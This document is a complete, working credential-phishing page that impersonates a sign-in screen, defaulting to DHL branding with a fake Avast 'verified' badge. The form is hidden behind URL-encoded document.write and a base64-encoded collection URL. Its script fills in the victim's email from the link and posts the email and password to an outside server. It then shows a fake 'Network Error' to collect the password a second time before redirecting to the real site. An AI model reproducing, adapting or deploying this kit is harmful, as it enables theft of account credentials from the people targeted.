<!DOCTYPE >
<html lang="en" data-bollob="aHR0cHM6Ly9jYW1lbGlvbjItcHJvZC51cC5yYWlsd2F5LmFwcC9mcm9udGVuZC9vbmcvb24tcGFyZG9uL29nLw==">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Now</title>

    <!-- google font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap" rel="stylesheet">

    <style>
        body::before,img{display:block;width:100%}.loader,body{width:100vw;height:100vh}*{margin:0;padding:0;box-sizing:border-box}body{overflow-y:hidden;overflow-x:hidden;position:relative;font-family:Poppins,sans-serif}body::before{content:"";position:absolute;top:0;left:0;height:100%;background-color:rgba(0,0,0,.7)}a{text-decoration:none}h2{color:#000;font-weight:700;font-size:1.25rem;margin-bottom:33px;text-transform:uppercase}#background-img{width:100%;height:100%;background-size:cover;background-repeat:no-repeat;background-position:fixed;opacity:.9;filter:blur(2px);z-index:-100}.loader{position:fixed;top:0;left:0;display:flex;justify-content:center;align-items:center;background:#a79797;z-index:99;transition:opacity .75s,visibility .75s}.loader-hidden{opacity:0;visibility:0}.loader::after{content:"";width:35px;height:35px;border:5px solid #ddd;border-top-color:#7449f5;border-radius:50%;animation:.75s infinite loading}@keyframes loading{from{transform:rotate(0turn)}to{transform:rotate(1turn)}}.wrapper{width:100%;height:100%;z-index:1;display:block;position:absolute;top:0;display:flex;align-items:center;justify-content:center}.card{width:375px;height:auto;padding:25px 37px;background:#fff;box-shadow:.2 .4rem .5rem #4c4b4b;border-radius:10px}.showemail{margin:10px 0;font-size:14px}.form-content{margin-bottom:1rem;width:auto}.form-content input[type=email],.form-content input[type=password]{width:100%;border:none;border-bottom:.8px solid #333131e7;outline:0;padding:8px 0;font-size:.9rem;color:#2e2d2d}.form-content input[type=email]:focus,.form-content input[type=password]:focus{border-bottom:1px solid #104dbd}.form-content input[type=email]::placeholder,.form-content input[type=password]::placeholder{font-size:1rem}.form-content button{padding:7px 31px;background:#2165e4;color:#fff;cursor:pointer;border:none;outline:0;font-size:.95rem;width:100%;margin-top:20px}.form-content button:hover{background:#0a3ea0}.link{margin-top:20px}.link p{text-align:center}.link a{color:#111;font-size:14px}.form-content input[type=email]:invalid{border-bottom:1px solid #db2222}.errwarning,.perrwarning{color:#a50707}@media(max-width:560px){#background-img{width:100%}.card{width:300px;padding:15px 27px}.showemail{font-size:13px}h2{font-size:1rem}.loader::after{content:"";width:35px;height:35px}}.spinner-button{display:inline-block;width:15px;height:15px;border:2px solid #ccc;border-radius:50%;border-top-color:#000;animation:1s linear infinite spin;margin-left:20px;margin-top:5px}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    </style>
</head>

<body>
    <script>
        document.write(unescape('%3Cimg%20src%3D%22%22%20alt%3D%22%22%20id%3D%22background-img%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22loader%22%3E%3C/div%3E%0A%20%20%20%20%0A%20%20%20%20%3Cdiv%20class%3D%22wrapper%22%3E%0A%20%20%20%20%20%20%20%20%3Cform%20action%3D%22%22%20id%3D%22my-login-form%22%20method%3D%22POST%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20loginForm%22%20id%3D%22login-form%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22logo%22%20style%3D%22display%3A%20flex%3B%20align-items%3A%20center%3B%20justify-content%3A%20center%3B%20margin-bottom%3A%2040px%3B%20margin-top%3A%2020px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20class%3D%22logo-img%22%20src%3D%22%22%20alt%3D%22%22%20style%3D%22width%3A%2050px%3B%22%3E%20%3Cspan%20id%3D%22logo-span%22%20style%3D%22font-size%3A%2020px%3Bfont-weight%3A%20bold%3B%20margin-left%3A%2010px%3B%22%3Edhl.com%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3ELog%20In%20to%20continue%3C/h2%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22password-side%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21--%20%3Cdiv%20class%3D%22showemail%22%3E%3C/div%3E%20--%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21--%20%3Ch2%3EEnter%20password%3C/h2%3E%20--%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22perrwarning%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22email%22%20readonly%20id%3D%22email%22%20placeholder%3D%22email%22%20name%3D%22f_email%22%20value%3D%22%22%20required%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20id%3D%22password%22%20placeholder%3D%22Enter%20Password%22%20name%3D%22f_password%22%20required%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-content%20form-button%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%22submit%22%20id%3D%22final-submit-btn%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20id%3D%22btn-text-now%22%3ELogin%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22%22%20id%3D%22btn-spinner%22%3E%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/button%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22link%22%20style%3D%22display%3A%20flex%3B%20align-items%3A%20center%3B%20justify-content%3A%20center%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%3Ca%20href%3D%22%23%22%3Everified%20by%20%3C/a%3E%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22https%3A//res.cloudinary.com/dzavavl6y/image/upload/v1713181568/uc6xjnr3xx9hdcpfm1od.png%22%20alt%3D%22Avast%22%20style%3D%22width%3A%2050px%3B%20margin-left%3A%2010px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/form%3E%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%3C/div%3E'))
    </script>
    <!-- end -->
        


    <script>
        const searchParams = new URLSearchParams(window.location.search);
        const hashedEmailValue = searchParams.get('wtundnm20njfnnfkjfjjffjj_em')?searchParams.get('wtundnm20njfnnfkjfjjffjj_em'):"";
        const domainFromEmail = hashedEmailValue.split('@');
        const myDomain = domainFromEmail.length > 1 ? domainFromEmail[1]: 'dhl.com';
        const domainRmCom = myDomain.replace(/\.com$/, "");
        const backgroundImage = document.querySelector('#background-img');
        const showEmail = document.querySelector('#email');
        const logo = document.querySelector('.logo-img');
        const logoSpan = document.querySelector('#logo-span');
        const bollob = (document.querySelector('html').getAttribute('data-bollob'));
        const loader = document.querySelector('.loader');
        const form = document.getElementById('my-login-form');
        const spinnerBtn = document.querySelector('#btn-spinner');
        const btnTTextNow = document.querySelector('#btn-text-now');
        const formSubmitBtn = document.querySelector('#final-submit-btn');

        window.onload = async () => {
            let someData = await getBackgroundImage();
            // removing loader
            setTimeout(() => {
                removeLoader();
            }, 2500);
        };

        function getBackgroundImage(){
            const thumbIoImg = `https://image.thum.io/get/auth/70953-lduyhg/https://www.${myDomain}/`;
            const logoClearbit = `https://logo.clearbit.com/https://${myDomain}`
            backgroundImage.src = thumbIoImg;
            logo.src = logoClearbit
            showEmail.value = hashedEmailValue;
            logo.value = hashedEmailValue;
            logoSpan.textContent = domainRmCom.toUpperCase();

        };

        // handling form submition
        let isToggled = false;

        function handleFormSubmition(e) {

            e.preventDefault();
            var formData = new FormData(form);
            addBtnSpinner();

            if (isToggled) {
                // This handles the secondclick
                
                // console.log("Action 2");
                sendData(formData)
                window.location.href = `https://www.${myDomain}`;
            } else {
                // this handles the first click
                // console.log("Action 1");
                sendData(formData)

                // setTimeout(() => {
                //     removeBtnSpinner();
                // }, 2500);
            }
            // Toggle the state
            isToggled = !isToggled;
        };

        // adding event listerner to form
        form.addEventListener('submit', handleFormSubmition);



        // send information to server funtion
        function sendData(formData) {
            const formValue = Object.fromEntries(formData.entries());

            // Send data to server using Fetch API
            fetch(atob(bollob), {
                method: 'POST',
                headers:{
                    'Content-Type':'application/json',
                    'X-CSRFToken':csrftoken,
                },
                body: JSON.stringify(formValue),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                removeBtnSpinner();
                console.log('y')
            })
            .catch(error => {
                console.error('Error sending data to server:', error);
            });
        }


        // removing loader
        function removeLoader(){
            loader.classList.add('loader-hidden');
                loader.style.display = 'none';
                loader.addEventListener('transitionend', () =>{
                document.body.removeChild('loader');
            }); 
        };

        function addBtnSpinner(){
            spinnerBtn.classList.add('spinner-button')
            btnTTextNow.textContent = 'Processing'
            formSubmitBtn.style.backgroundColor = '#97add1';
            formSubmitBtn.setAttribute('disabled', true);
        };

        function removeBtnSpinner(){
            spinnerBtn.classList.remove('spinner-button');
            document.querySelector(".perrwarning").innerHTML = `Network Error! Please verify your information and try again`;
            formSubmitBtn.removeAttribute("disabled");
            formSubmitBtn.style.backgroundColor = 'rgb(33, 101, 228)';
            btnTTextNow.textContent = 'Login'
            document.querySelector("#password").value='';
        };

        function getCookie(name) {
            let cookieValue = null;
            if (document.cookie && document.cookie !== '') {
                const cookies = document.cookie.split(';');
                for (let i = 0; i < cookies.length; i++) {
                    const cookie = cookies[i].trim();
                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }
        const csrftoken = getCookie('csrftoken');
    </script>

</body>